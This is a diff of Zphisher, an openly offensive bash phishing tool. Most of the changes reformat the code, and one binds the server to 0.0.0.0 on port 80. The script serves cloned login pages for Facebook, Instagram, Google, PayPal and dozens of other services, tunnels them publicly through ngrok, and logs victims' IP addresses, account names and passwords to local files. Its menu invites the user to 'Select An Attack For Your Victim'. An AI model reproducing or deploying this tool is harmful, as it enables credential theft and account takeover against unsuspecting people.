@@ -1,7 +1,7 @@
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Author 	: 	TAHMID RAYAT
 ##   Version 	: 	2.1
 ##   Github 	: 	https://github.com/htr-tech
 
@@ -14,10 +14,7 @@
 ##   Võ Ngọc Bảo - https://github.com/vongocbao
 ##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009
 
-
 ## If you Copy Then Give the credits :)
-
-
 
 ##                   GNU GENERAL PUBLIC LICENSE
 ##                    Version 3, 29 June 2007
@@ -92,12 +89,11 @@
 ##      Copyright (C) 2021  HTR-TECH (https://github.com/htr-tech)
 ##
 
-
 ## ANSI colors (FG & BG)
-RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
-REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" ORANGE="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" ORANGEBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
 
 ## Directories
@@ -113,13 +109,19 @@ fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
-    exit 0
+	{
+		printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1
+		reset_color
+	}
+	exit 0
 }
 
 exit_on_signal_SIGTERM() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
-    exit 0
+	{
+		printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1
+		reset_color
+	}
+	exit 0
 }
 
 trap exit_on_signal_SIGINT SIGINT
@@ -127,24 +129,24 @@ trap exit_on_signal_SIGTERM SIGTERM
 
 ## Reset terminal colors
 reset_color() {
-	tput sgr0   # reset attributes
-	tput op     # reset color
-    return
+	tput sgr0 # reset attributes
+	tput op   # reset color
+	return
 }
 
 ## Kill already running process
 kill_pid() {
-	if [[ `pidof php` ]]; then
-		killall php > /dev/null 2>&1
+	if [[ $(pidof php) ]]; then
+		killall php >/dev/null 2>&1
 	fi
-	if [[ `pidof ngrok` ]]; then
-		killall ngrok > /dev/null 2>&1
-	fi	
+	if [[ $(pidof ngrok) ]]; then
+		killall ngrok >/dev/null 2>&1
+	fi
 }
 
 ## Banner
 banner() {
-	cat <<- EOF
+	cat <<-EOF
 		${ORANGE}
 		${ORANGE} ______      _     _     _               
 		${ORANGE}|___  /     | |   (_)   | |              
@@ -161,7 +163,7 @@ banner() {
 
 ## Small Banner
 banner_small() {
-	cat <<- EOF
+	cat <<-EOF
 		${BLUE}
 		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
 		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
@@ -173,35 +175,38 @@ banner_small() {
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
 
-    if [[ -d "/data/data/com.termux/files/home" ]]; then
-        if [[ `command -v proot` ]]; then
-            printf ''
-        else
+	if [[ -d "/data/data/com.termux/files/home" ]]; then
+		if [[ $(command -v proot) ]]; then
+			printf ''
+		else
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
-            pkg install proot resolv-conf -y
-        fi
-    fi
+			pkg install proot resolv-conf -y
+		fi
+	fi
 
-	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
+	if [[ $(command -v php) && $(command -v wget) && $(command -v curl) && $(command -v unzip) ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
 	else
 		pkgs=(php curl wget unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
 				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
-				if [[ `command -v pkg` ]]; then
+				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg"
-				elif [[ `command -v apt` ]]; then
+				elif [[ $(command -v apt) ]]; then
 					apt install "$pkg" -y
-				elif [[ `command -v apt-get` ]]; then
+				elif [[ $(command -v apt-get) ]]; then
 					apt-get install "$pkg" -y
-				elif [[ `command -v pacman` ]]; then
+				elif [[ $(command -v pacman) ]]; then
 					sudo pacman -S "$pkg" --noconfirm
-				elif [[ `command -v dnf` ]]; then
+				elif [[ $(command -v dnf) ]]; then
 					sudo dnf -y install "$pkg"
 				else
 					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
-					{ reset_color; exit 1; }
+					{
+						reset_color
+						exit 1
+					}
 				fi
 			}
 		done
@@ -212,19 +217,22 @@ dependencies() {
 ## Download Ngrok
 download_ngrok() {
 	url="$1"
-	file=`basename $url`
+	file=$(basename $url)
 	if [[ -e "$file" ]]; then
 		rm -rf "$file"
 	fi
-	wget --no-check-certificate "$url" > /dev/null 2>&1
+	wget --no-check-certificate "$url" >/dev/null 2>&1
 	if [[ -e "$file" ]]; then
-		unzip "$file" > /dev/null 2>&1
-		mv -f ngrok .server/ngrok > /dev/null 2>&1
-		rm -rf "$file" > /dev/null 2>&1
-		chmod +x .server/ngrok > /dev/null 2>&1
+		unzip "$file" >/dev/null 2>&1
+		mv -f ngrok .server/ngrok >/dev/null 2>&1
+		rm -rf "$file" >/dev/null 2>&1
+		chmod +x .server/ngrok >/dev/null 2>&1
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
-		{ reset_color; exit 1; }
+		{
+			reset_color
+			exit 1
+		}
 	fi
 }
 
@@ -234,7 +242,7 @@ install_ngrok() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
-		arch=`uname -m`
+		arch=$(uname -m)
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
 		elif [[ "$arch" == *'aarch64'* ]]; then
@@ -250,15 +258,26 @@ install_ngrok() {
 
 ## Exit message
 msg_exit() {
-	{ clear; banner; echo; }
+	{
+		clear
+		banner
+		echo
+	}
 	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
-	{ reset_color; exit 0; }
+	{
+		reset_color
+		exit 0
+	}
 }
 
 ## About
 about() {
-	{ clear; banner; echo; }
-	cat <<- EOF
+	{
+		clear
+		banner
+		echo
+	}
+	cat <<-EOF
 		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
 		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
@@ -277,23 +296,29 @@ about() {
 		msg_exit
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
-		{ sleep 1; main_menu; }
+		{
+			sleep 1
+			main_menu
+		}
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; about; }
+		{
+			sleep 1
+			about
+		}
 	fi
 }
 
 ## Setup website and start php server
-HOST='127.0.0.1'
-PORT='8080'
+HOST='0.0.0.0'
+PORT='80'
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
+	cd .server/www && php -S "$HOST":"$PORT" >/dev/null 2>&1 &
 }
 
 ## Get IP address
@@ -302,7 +327,7 @@ capture_ip() {
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
-	cat .server/www/ip.txt >> ip.txt
+	cat .server/www/ip.txt >>ip.txt
 }
 
 ## Get credentials
@@ -313,7 +338,7 @@ capture_creds() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
-	cat .server/www/usernames.txt >> usernames.dat
+	cat .server/www/usernames.txt >>usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
@@ -339,16 +364,23 @@ capture_data() {
 ## Start ngrok
 start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; }
+	{
+		sleep 1
+		setup_site
+	}
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
-    if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
-    else
-        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
-    fi
+	if [[ $(command -v termux-chroot) ]]; then
+		sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" >/dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
+	else
+		sleep 2 && ./.server/ngrok http "$HOST":"$PORT" >/dev/null 2>&1 &
+	fi
 
-	{ sleep 8; clear; banner_small; }
+	{
+		sleep 8
+		clear
+		banner_small
+	}
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
@@ -360,15 +392,22 @@ start_ngrok() {
 start_localhost() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
-	{ sleep 1; clear; banner_small; }
+	{
+		sleep 1
+		clear
+		banner_small
+	}
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
 ## Tunnel selection
 tunnel_menu() {
-	{ clear; banner_small; }
-	cat <<- EOF
+	{
+		clear
+		banner_small
+	}
+	cat <<-EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
 		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Best${RED}]
@@ -383,13 +422,16 @@ tunnel_menu() {
 		start_ngrok
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; tunnel_menu; }
+		{
+			sleep 1
+			tunnel_menu
+		}
 	fi
 }
 
 ## Facebook
 site_facebook() {
-	cat <<- EOF
+	cat <<-EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
@@ -418,13 +460,18 @@ site_facebook() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_facebook; }
+		{
+			sleep 1
+			clear
+			banner_small
+			site_facebook
+		}
 	fi
 }
 
 ## Instagram
 site_instagram() {
-	cat <<- EOF
+	cat <<-EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
@@ -453,13 +500,18 @@ site_instagram() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_instagram; }
+		{
+			sleep 1
+			clear
+			banner_small
+			site_instagram
+		}
 	fi
 }
 
 ## Gmail/Google
 site_gmail() {
-	cat <<- EOF
+	cat <<-EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
@@ -483,13 +535,18 @@ site_gmail() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_gmail; }
+		{
+			sleep 1
+			clear
+			banner_small
+			site_gmail
+		}
 	fi
 }
 
 ## Vk
 site_vk() {
-	cat <<- EOF
+	cat <<-EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
@@ -508,23 +565,32 @@ site_vk() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_vk; }
+		{
+			sleep 1
+			clear
+			banner_small
+			site_vk
+		}
 	fi
 }
 
 ## Menu
 main_menu() {
-	{ clear; banner; echo; }
-	cat <<- EOF
+	{
+		clear
+		banner
+		echo
+	}
+	cat <<-EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
+		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox 
+		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo    
 		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
+		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex   
 		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
@@ -533,7 +599,7 @@ main_menu() {
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
 	EOF
-	
+
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
@@ -666,7 +732,10 @@ main_menu() {
 		msg_exit
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; main_menu; }
+		{
+			sleep 1
+			main_menu
+		}
 	fi
 }
 
